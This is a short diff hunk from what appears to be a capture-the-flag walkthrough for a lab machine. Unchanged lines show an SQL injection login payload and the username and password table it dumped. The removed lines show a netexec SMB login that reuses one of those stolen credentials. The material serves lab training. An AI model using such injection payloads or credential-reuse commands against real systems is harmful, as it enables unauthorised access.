@@ -221,16 +221,7 @@ username=admin%22or+1%3D1+or+%22%22%3D%22&password=&submit=Login
 Username Password<br>Tove             Jani<br>Godzilla             KONGistheKING<br>SuperMan             snyderCut<br>ArthurMorgan             DeadEye<br>
 ```
 
-<img width="1744" height="132" alt="image" src="https://github.com/user-attachments/assets/9bc55124-f0f7-495b-901c-d7b7951fde56" />
-
 <br>
-<br>
-
-```bash
-:~/ColdVVars# nxc smb coldvvars.thm -u 'ArthurMorgan' -p 'DeadEye' --continue-on-success
-SMB         xx.xxx.xx.xxx   445    IP-xx-xxx-xx-xxx [*] Unix - Samba (name:IP-xx-xxx-xx-xxx) (domain:ec2.internal) (signing:False) (SMBv1:False) 
-SMB         xx.xxx.xx.xxx   445    IP-xx-xx-xx-xxx [+] ec2.internal\ArthurMorgan:DeadEye 
-```
 
 <img width="1278" height="152" alt="image" src="https://github.com/user-attachments/assets/85516a66-552a-4d25-b5f2-06d1c2737c8b" />
 
